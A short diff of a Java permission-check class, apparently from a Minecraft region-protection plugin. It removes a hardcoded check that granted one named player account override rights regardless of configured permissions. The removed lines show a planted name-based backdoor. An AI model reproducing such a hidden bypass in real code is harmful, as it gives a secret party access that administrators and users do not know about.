@@ -13,9 +13,7 @@ public class PermChecks {
 		if(PermissionsCore.doesHaveNode(p, ("regios.override." + r.getName())) || PermissionsCore.doesHaveNode(p, "regios.override.all")){
 			return true;
 		}
-		if(p.getName().equals("Adamki11s")){
-			return true;
-		} else if(p.isOp()){
+		if(p.isOp()){
 			return true;
 		} else if(r.getOwner().equals(p.getName())){
 			return true;
